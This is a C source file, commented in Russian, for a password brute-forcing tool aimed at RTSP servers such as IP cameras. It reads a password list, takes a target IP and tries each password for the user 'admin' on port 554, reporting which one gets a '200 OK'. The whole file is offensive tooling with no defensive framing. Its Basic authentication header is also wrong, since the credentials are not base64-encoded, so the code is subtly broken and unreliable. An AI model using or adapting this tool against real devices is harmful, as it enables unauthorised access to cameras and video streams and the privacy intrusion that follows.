#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024
#define PASSWORD_LENGTH 100

// Функция для брутфорсинга RTSP
void rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];

    // Создаем сокет
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Ошибка создания сокета");
        return;
    }

    // Настраиваем адрес сервера
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Подключаемся к серверу
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Ошибка подключения");
        close(sock);
        return;
    }

    // Формируем RTSP запрос
    snprintf(request, sizeof(request), "OPTIONS rtsp://%s/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic %s:%s\r\n\r\n", target_ip, username, password);
    send(sock, request, strlen(request), 0);

    // Получаем ответ
    recv(sock, response, sizeof(response) - 1, 0);
    response[sizeof(response) - 1] = '\0'; // Обеспечиваем нуль-терминацию

    // Проверяем ответ
    if (strstr(response, "200 OK") != NULL) {
        // Выводим успешный пароль зеленым цветом
        printf("\033[0;32mУспешный пароль: %s\033[0m\n", password);
        close(sock);
        return; // Возвращаемся, чтобы продолжить проверку других паролей
    } else {
        printf("Неверный пароль: %s\n", password);
    }

    close(sock);
}

int main() {
    char target_ip[16];
    int target_port = 554; // Стандартный порт RTSP
    const char *username = "admin"; // Имя пользователя
    char **passwords = NULL;
    int password_count = 0;
    int capacity = 10; // Начальная емкость для паролей

    // Выделяем память для массива паролей
    passwords = malloc(capacity * sizeof(char *));
    if (passwords == NULL) {
        perror("Ошибка выделения памяти");
        return 1;
    }

    // Открываем файл с паролями
    FILE *file = fopen("passwords.txt", "r");
    if (file == NULL) {
        perror("Ошибка открытия файла");
        free(passwords);
        return 1;
    }

    // Читаем пароли из файла
    char buffer[PASSWORD_LENGTH];
    while (fgets(buffer, PASSWORD_LENGTH, file) != NULL) {
        // Убираем символ новой строки, если он есть
        buffer[strcspn(buffer, "\n")] = 0;

        // Если емкость массива паролей исчерпана, увеличиваем ее
        if (password_count >= capacity) {
            capacity *= 2; // Увеличиваем емкость вдвое
            passwords = realloc(passwords, capacity * sizeof(char *));
            if (passwords == NULL) {
                perror("Ошибка выделения памяти");
                fclose(file);
                return 1;
            }
        }

        // Выделяем память для нового пароля и копируем его
        passwords[password_count] = malloc((strlen(buffer) + 1) * sizeof(char));
        if (passwords[password_count] == NULL) {
            perror("Ошибка выделения памяти");
            fclose(file);
            return 1;
        }
        strcpy(passwords[password_count], buffer);
        password_count++;
    }
    fclose(file);

    // Запрашиваем IP-адрес у пользователя
    printf("Введите IP-адрес RTSP сервера: ");
    scanf("%15s", target_ip);

    // Перебираем пароли
    for (int i = 0; i < password_count; i++) {
        rtsp_bruteforce(target_ip, target_port, username, passwords[i]);
        free(passwords[i]); // Освобождаем память для каждого пароля
    }

    free(passwords); // Освобождаем память для массива паролей
    return 0;
}
       
